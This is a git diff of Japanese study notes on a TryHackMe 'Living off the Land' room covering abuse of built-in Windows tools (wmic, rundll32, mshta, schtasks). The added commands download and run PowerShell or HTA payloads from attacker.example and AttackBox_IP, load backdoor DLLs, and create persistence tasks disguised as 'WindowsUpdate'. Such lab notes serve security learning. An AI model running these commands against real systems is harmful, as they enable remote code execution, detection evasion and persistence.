@@ -2,6 +2,8 @@
 
 https://tryhackme.com/r/room/livingofftheland
 
+https://tryhackme.com/room/livingoffthelandattacks
+
 OS 標準のツール、または Microsoft 署名付きのツールを使って検出を回避する
 
 ## LOLBAS
@@ -56,11 +58,39 @@ explorer.exe /root,"C:\Windows\System32\calc.exe"
 
 ### wmic
 
+管理者がローカルまたはリモートのWindowsシステムを照会および管理するためのツール。  
+脅威アクターは、プロセスを起動することでリモートからコマンドを実行するために使用する。  
+WMI ではコマンドの出力を表示することはできない。
+
 ```ps
 wmic.exe process call create calc
 ```
 
+```ps
+wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
+
+wmic /node:TARGETHOST process get name,commandline
+
+wmic process call create "notepad.exe" /hidden
+```
+
 ### rundll32
+
+#### 単純な例：指定したdllの指定した関数を実行
+
+```ps
+rundll32.exe C:\Users\Public\backdoor.dll,Start
+
+rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"
+
+rundll32.exe C:\Windows\Temp\loader.dll,Run
+```
+
+#### 複雑な例：javascript を渡して mshtml.dll に実行させる
+
+1. `javascript:...` の文字列全体がrundll32.exe に渡される
+2. rundll32 は、`javascript:...`の文字列を解析し、dllのパスと実行する関数を認識する
+3. rundll32 は、その関数に `eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");` を渡して実行させるイメージ。（あくまでイメージで、正確にその文字列が渡るのかは未確認）
 
 ```ps
 rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
@@ -70,6 +100,30 @@ Powershell を実行してファイルダウンロードしている
 
 ```ps
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+```
+
+### mshta
+
+VBScript または JavaScript コードを含むことができる HTML アプリケーション ( HTA ) ファイルを実行する。
+
+```ps
+mshta "http://attacker.example/payload.hta"
+
+mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"
+
+mshta "C:\Users\Public\malicious.hta"
+```
+
+### schtasks
+
+永続化
+
+```ps
+schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""
+
+schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05
+
+schtasks /Run /TN "WindowsUpdate"
 ```
 
 ## ホワイトリストバイパス
